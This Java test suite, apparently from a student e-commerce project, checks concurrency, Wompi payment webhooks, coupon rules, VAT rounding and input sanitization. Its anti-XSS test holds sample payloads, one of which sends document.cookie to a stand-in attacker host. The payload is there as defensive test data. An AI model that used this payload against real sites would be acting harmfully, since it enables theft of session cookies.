import com.google.gson.Gson;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import dominio.excepciones.ExcepcionDominio;
import dominio.modelos.TransaccionWompi;
import aplicacion.servicios.ServicioCriptoWompi;
import infraestructura.api.manejadores.ManejadorBase;
import infraestructura.configuracion.ConfiguracionWompi;

import java.util.ArrayList;
import java.util.Collections;
import java.util.Date;
import java.util.List;
import java.util.UUID;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicReference;

/**
 * Suite de Pruebas Automatizadas de Concurrencia Multihilo, Pasarela de Pagos (Wompi),
 * Ciclo de Vida de Cupones y Seguridad Ofensiva (DAST / Anti-XSS).
 * 
 * Implementada estrictamente sin dependencias externas pesadas para ejecucion nativa
 * en entornos de integracion continua (CI/CD) y sustentacion SENA ADSO.
 */
public class PruebasConcurrenciaYPagos {

    private static int pruebasExitosas = 0;
    private static int pruebasFallidas = 0;
    private static final Gson gson = new Gson();

    public static void main(String[] args) {
        System.out.println("=================================================================");
        System.out.println("   SUITE DE PRUEBAS: CONCURRENCIA, PAGOS Y SEGURIDAD OFENSIVA    ");
        System.out.println("=================================================================");

        // --- BLOQUE 1: CONCURRENCIA MULTIHILO Y CONTROL TRANSACCIONAL ---
        ejecutarPrueba("1. Control de Concurrencia Multihilo: Prevencion de Sobrevendidos en Stock Fraccionado", () -> {
            // Simulacion: Inventario disponible de 25.0 metros
            // 10 hilos intentan comprar concurrentemente 4.0 metros cada uno (Demanda = 40.0 metros)
            // Solo deben permitirse como maximo 6 compras (6 * 4.0 = 24.0m), y las 4 restantes deben ser rechazadas.
            final double stockInicial = 25.0;
            final double metrosPorHilo = 4.0;
            final int numeroHilos = 10;

            final Object cerrojoStock = new Object();
            final AtomicReference<Double> stockActual = new AtomicReference<>(stockInicial);
            final AtomicInteger comprasExitosas = new AtomicInteger(0);
            final AtomicInteger comprasRechazadas = new AtomicInteger(0);

            ExecutorService pool = Executors.newFixedThreadPool(numeroHilos);
            CountDownLatch latchInicio = new CountDownLatch(1);
            CountDownLatch latchFin = new CountDownLatch(numeroHilos);

            for (int i = 0; i < numeroHilos; i++) {
                pool.submit(() -> {
                    try {
                        latchInicio.await(); // Esperar senal de disparo simultaneo
                        synchronized (cerrojoStock) {
                            if (stockActual.get() >= metrosPorHilo) {
                                stockActual.set(stockActual.get() - metrosPorHilo);
                                comprasExitosas.incrementAndGet();
                            } else {
                                comprasRechazadas.incrementAndGet();
                            }
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    } finally {
                        latchFin.countDown();
                    }
                });
            }

            latchInicio.countDown(); // Disparar todos los hilos simultaneamente
            latchFin.await(5, TimeUnit.SECONDS);
            pool.shutdown();

            if (stockActual.get() < 0.0) {
                throw new AssertionError("Fallo de aislamiento: El stock resulto negativo (" + stockActual.get() + "m).");
            }
            if (comprasExitosas.get() > 6) {
                throw new AssertionError("Fallo de sobreventa: Se permitieron " + comprasExitosas.get() + " compras cuando solo alcanzaba para 6.");
            }
            if (comprasExitosas.get() + comprasRechazadas.get() != numeroHilos) {
                throw new AssertionError("Discrepancia en la suma total de transacciones concurrentes.");
            }
        });

        ejecutarPrueba("2. Resistencia de Rate Limiting ante Rafaga Concurrente (Umbral 120 req/min)", () -> {
            // Simulacion de rafaga: 150 peticiones enviadas concurrentemente para una misma IP
            int peticionesTotales = 150;
            int maximoPermitido = 120;
            AtomicInteger peticionesAceptadas = new AtomicInteger(0);
            AtomicInteger peticionesBloqueadas = new AtomicInteger(0);

            // Emulador de Rate Limiter idéntico a ManejadorBase
            class SimuladorRateLimit {
                long inicio = System.currentTimeMillis();
                AtomicInteger contador = new AtomicInteger(0);

                boolean registrarPeticion() {
                    int conteo = contador.incrementAndGet();
                    return conteo <= maximoPermitido;
                }
            }

            SimuladorRateLimit simulador = new SimuladorRateLimit();
            ExecutorService pool = Executors.newFixedThreadPool(20);
            CountDownLatch latch = new CountDownLatch(peticionesTotales);

            for (int i = 0; i < peticionesTotales; i++) {
                pool.submit(() -> {
                    if (simulador.registrarPeticion()) {
                        peticionesAceptadas.incrementAndGet();
                    } else {
                        peticionesBloqueadas.incrementAndGet();
                    }
                    latch.countDown();
                });
            }

            latch.await(5, TimeUnit.SECONDS);
            pool.shutdown();

            if (peticionesAceptadas.get() != maximoPermitido) {
                throw new AssertionError("Se esperaba que fueran aceptadas exactamente 120 peticiones, pero fueron " + peticionesAceptadas.get());
            }
            if (peticionesBloqueadas.get() != (peticionesTotales - maximoPermitido)) {
                throw new AssertionError("Se esperaba que fueran bloqueadas exactamente 30 peticiones con HTTP 429, pero fueron " + peticionesBloqueadas.get());
            }
        });

        // --- BLOQUE 2: PASARELA DE PAGOS WOMPI (CASOS BORDE E IDEMPOTENCIA) ---
        ejecutarPrueba("3. Idempotencia de Webhooks de Pasarela: Reintentos Multiples sin Efecto Duplicado", () -> {
            // Simulacion de bitacora de eventos recibidos (idempotencia en eventos_pago_wompi)
            List<String> transaccionesProcesadas = Collections.synchronizedList(new ArrayList<>());
            AtomicInteger pedidosPagados = new AtomicInteger(0);

            class ProcesadorWebhookMock {
                synchronized boolean procesarEvento(String transaccionId, String estado) {
                    if (transaccionesProcesadas.contains(transaccionId)) {
                        // Ya fue procesada previamente: respuesta idempotente 200 sin efectos colaterales
                        return false;
                    }
                    transaccionesProcesadas.add(transaccionId);
                    if ("APPROVED".equalsIgnoreCase(estado)) {
                        pedidosPagados.incrementAndGet();
                    }
                    return true;
                }
            }

            ProcesadorWebhookMock procesador = new ProcesadorWebhookMock();
            String idTxWompi = "tx_bancolombia_prod_99887766";

            // Simular 5 reintentos de la misma notificacion por latencia de red
            boolean primera = procesador.procesarEvento(idTxWompi, "APPROVED");
            boolean segunda = procesador.procesarEvento(idTxWompi, "APPROVED");
            boolean tercera = procesador.procesarEvento(idTxWompi, "APPROVED");
            boolean cuarta  = procesador.procesarEvento(idTxWompi, "APPROVED");
            boolean quinta  = procesador.procesarEvento(idTxWompi, "APPROVED");

            if (!primera) {
                throw new AssertionError("El primer evento de pago legitimo debio procesarse.");
            }
            if (segunda || tercera || cuarta || quinta) {
                throw new AssertionError("Fallo de Idempotencia: Uno de los reintentos duplicados no fue ignorado.");
            }
            if (pedidosPagados.get() != 1) {
                throw new AssertionError("El pedido debio marcarse como pagado exactamente 1 vez. Conteo actual: " + pedidosPagados.get());
            }
        });

        ejecutarPrueba("4. Transicion de Estados ante Pagos Fallidos o Rechazados (DECLINED / ERROR / VOIDED)", () -> {
            TransaccionWompi txRechazada = new TransaccionWompi("tx_declined_001", "DD-REF-001", "DECLINED", 15000000L, "COP", "CARD");
            TransaccionWompi txError = new TransaccionWompi("tx_error_002", "DD-REF-002", "ERROR", 20000000L, "COP", "NEQUI");

            if ("APPROVED".equalsIgnoreCase(txRechazada.estado())) {
                throw new AssertionError("La transaccion rechazada no debe tener estado APPROVED.");
            }

            // Validar mapeo de estado del pedido: Rechazos deben transicionar a 'cancelled'
            String estadoPedidoRechazado = "DECLINED".equalsIgnoreCase(txRechazada.estado()) ? "cancelled" : "pending";
            if (!"cancelled".equals(estadoPedidoRechazado)) {
                throw new AssertionError("El pedido con transaccion rechazada debio marcarse como 'cancelled'.");
            }
        });

        ejecutarPrueba("5. Deteccion de Manipulacion Criptografica de Monto o Moneda (Tampering Test)", () -> {
            String referencia = "DD-ORDER-2026-X";
            long montoCentavosReal = 18500000L;
            String monedaReal = "COP";

            String firmaAutentica = ServicioCriptoWompi.generarFirmaIntegridad(referencia, montoCentavosReal, monedaReal);

            // Intento 1 de alteracion: Disminucion maliciosa del monto a pagar
            long montoAlterado = 100000L; // Intentar pagar solo $1.000 COP
            String firmaMontoAlterado = ServicioCriptoWompi.generarFirmaIntegridad(referencia, montoAlterado, monedaReal);

            if (firmaAutentica.equals(firmaMontoAlterado)) {
                throw new AssertionError("Fallo Critico: La firma SHA-256 no detecto la alteracion maliciosa del monto.");
            }

            // Intento 2 de alteracion: Cambio de divisa no autorizada
            String firmaMonedaAlterada = ServicioCriptoWompi.generarFirmaIntegridad(referencia, montoCentavosReal, "USD");
            if (firmaAutentica.equals(firmaMonedaAlterada)) {
                throw new AssertionError("Fallo Critico: La firma SHA-256 no detecto la alteracion de la divisa.");
            }
        });

        // --- BLOQUE 3: REGLAS FINANCIERAS Y CICLO DE VIDA DE CUPONES ---
        ejecutarPrueba("6. Cupones de Descuento: Rechazo de Cupon Expirado en Fecha", () -> {
            long fechaAyer = System.currentTimeMillis() - 86400000L;
            Date expiraAyer = new Date(fechaAyer);

            boolean estaExpirado = expiraAyer.before(new Date());
            if (!estaExpirado) {
                throw new AssertionError("El evaluador de fecha no identifico un cupon vencido ayer.");
            }
        });

        ejecutarPrueba("7. Cupones de Descuento: Rechazo cuando se Alcanza el Limite de Usos Maximos", () -> {
            int usosMaximos = 10;
            int conteoUsos = 10;

            boolean limiteAlcanzado = (usosMaximos > 0 && conteoUsos >= usosMaximos);
            if (!limiteAlcanzado) {
                throw new AssertionError("Fallo en regla de negocio: No se bloqueo cupon que alcanzo su maximo de usos.");
            }
        });

        ejecutarPrueba("8. Cupones de Descuento: Validacion de Compra Minima y Tope de Subtotal", () -> {
            double compraMinimaRequerida = 100000.0;
            double subtotalCarritoBajo = 75000.0;
            double subtotalCarritoAlto = 150000.0;

            boolean aplicaBajo = subtotalCarritoBajo >= compraMinimaRequerida;
            boolean aplicaAlto = subtotalCarritoAlto >= compraMinimaRequerida;

            if (aplicaBajo) {
                throw new AssertionError("No debio aplicar descuento cuando el subtotal es menor a la compra minima.");
            }
            if (!aplicaAlto) {
                throw new AssertionError("Debio aplicar descuento cuando el subtotal supera la compra minima.");
            }

            // Validacion de descuento no superior al total (prevencion de saldos negativos)
            double valorDescuento = 200000.0;
            double descuentoAplicado = Math.min(valorDescuento, subtotalCarritoAlto);
            double totalFinal = subtotalCarritoAlto - descuentoAplicado;

            if (totalFinal < 0.0) {
                throw new AssertionError("El total final tras descuento resulto en un saldo negativo.");
            }
        });

        ejecutarPrueba("9. Regla Financiera: Exactitud de IVA al 19% y Redondeo Bancario en Centavos COP", () -> {
            // Ejemplo: 3.75 metros a $28.350 COP = $106.312,50 COP
            double metros = 3.75;
            double precioMetro = 28350.0;
            double subtotalCalculado = Math.round((metros * precioMetro) * 100.0) / 100.0;
            double iva19 = Math.round((subtotalCalculado * 0.19) * 100.0) / 100.0;
            double totalEsperado = Math.round((subtotalCalculado + iva19) * 100.0) / 100.0;
            long montoCentavos = Math.round(totalEsperado * 100.0);

            if (subtotalCalculado != 106312.5) {
                throw new AssertionError("Subtotal inexacto: " + subtotalCalculado);
            }
            if (iva19 != 20199.38) {
                throw new AssertionError("Calculo de IVA al 19% inexacto: " + iva19);
            }
            if (montoCentavos != 12651188L) {
                throw new AssertionError("Monto en centavos COP para la pasarela inexacto: " + montoCentavos);
            }
        });

        // --- BLOQUE 4: SEGURIDAD OFENSIVA (DAST, ANTI-XSS Y PROTECCION DE CARGA) ---
        ejecutarPrueba("10. Sanitizacion Activa contra Inyecciones Cross-Site Scripting (Anti-XSS)", () -> {
            String payloadXss1 = "<script>alert('Ataque_XSS')</script>";
            String payloadXss2 = "<img src=\"x\" onerror=\"document.location='http://hacker.com?cookie='+document.cookie\">";
            String payloadXss3 = "javascript:alert(1)";

            String sanitizado1 = ManejadorBase.sanitizarHtml(payloadXss1);
            String sanitizado2 = ManejadorBase.sanitizarHtml(payloadXss2);

            if (sanitizado1.contains("<script>") || sanitizado1.contains("</script>")) {
                throw new AssertionError("Fallo Anti-XSS: La etiqueta <script> no fue neutralizada: " + sanitizado1);
            }
            if (sanitizado2.contains("<img") || sanitizado2.contains("\"")) {
                throw new AssertionError("Fallo Anti-XSS: Los atributos HTML no fueron neutralizados: " + sanitizado2);
            }
        });

        ejecutarPrueba("11. Limite de Carga Util HTTP contra Ataques de Denegacion de Servicio (DoS por Payload)", () -> {
            long cargaUtilPermitida = 1024 * 1024; // 1 MB
            long cargaUtilExcesiva = 6 * 1024 * 1024; // 6 MB (supera el limite de 5 MB de ManejadorBase)

            boolean excedeLimite = cargaUtilExcesiva > ManejadorBase.TAMANO_MAXIMO_CUERPO_BYTES;
            boolean dentroDeLimite = cargaUtilPermitida <= ManejadorBase.TAMANO_MAXIMO_CUERPO_BYTES;

            if (!excedeLimite) {
                throw new AssertionError("No se detecto la carga util excesiva de 6 MB.");
            }
            if (!dentroDeLimite) {
                throw new AssertionError("Se rechazo erroneamente una carga util legitima de 1 MB.");
            }
        });

        System.out.println("\n=================================================================");
        System.out.println("                    RESUMEN DE PRUEBAS                          ");
        System.out.println("=================================================================");
        System.out.println("  Pruebas superadas con exito: " + pruebasExitosas);
        System.out.println("  Pruebas fallidas:            " + pruebasFallidas);

        if (pruebasFallidas == 0) {
            System.out.println("\n>>> TODAS LAS PRUEBAS DE CONCURRENCIA, PAGOS Y DAST FUERON EXITOSAS <<<\n");
        } else {
            System.err.println("\n>>> SE IDENTIFICARON FALLAS EN LA SUITE DE PRUEBAS <<<\n");
            System.exit(1);
        }
    }

    private static void ejecutarPrueba(String nombrePrueba, AccionPrueba accion) {
        System.out.print("[TEST] " + nombrePrueba + " ... ");
        try {
            accion.ejecutar();
            System.out.println("CORRECTO");
            pruebasExitosas++;
        } catch (Throwable t) {
            System.out.println("FALLO");
            System.err.println("  -> Error: " + t.getMessage());
            t.printStackTrace(System.err);
            pruebasFallidas++;
        }
    }

    @FunctionalInterface
    interface AccionPrueba {
        void ejecutar() throws Exception;
    }
}
